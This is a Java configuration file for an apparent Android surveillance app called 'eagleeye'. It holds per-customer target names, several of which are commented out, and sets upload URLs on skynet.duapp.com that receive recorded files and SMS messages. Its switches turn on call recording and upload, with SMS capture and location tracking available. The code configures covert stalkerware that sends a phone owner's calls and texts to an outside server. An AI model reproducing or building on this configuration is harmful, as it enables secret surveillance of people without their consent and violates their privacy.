package net.web135.eagleeye;

public class Define {
	//给用户定义好的监控实体对象名
//	public static final String entityName = "TestSkyNet";
//	public static final String entityName = "tb_dbtx";
//	public static final String entityName = "tb_zah08";
//	public static final String entityName = "tb855933";
//	public static final String entityName = "tb_shutshuff";
//	public static final String entityName = "tb_wansgw1";
//	public static final String entityName = "tb4812351";
//	public static final String entityName = "miaoailu0302";
//	public static final String entityName = "tb_bihuomei";
//	public static final String entityName = "tb_yw2012";
//	public static final String entityName = "tb_faiiy";
	public static final String entityName = "tb_qingbaby";
	
	
	public static final String upload2ServletPath = "http://skynet.duapp.com/SkyNet/FileReciver";
//	public static final String upload2ServletPath = "http://192.168.1.109/FilesServer/FileReciver";
	public static final String uploadSmsPath = "http://skynet.duapp.com/SkyNet/SmsReciverServlet";
//	public static final String uploadSmsPath = "http://192.168.1.109/FilesServer/SmsReciverServlet";

	public static final boolean enableRecord = true;//是否录音
	public static final boolean enableRecordUpload = true;//录音是否上传
	public static final boolean enableSmsUpload = false;//是否开启短信监控功能
	public static final boolean enableTrace = false;//是否开启定位功能
	
}
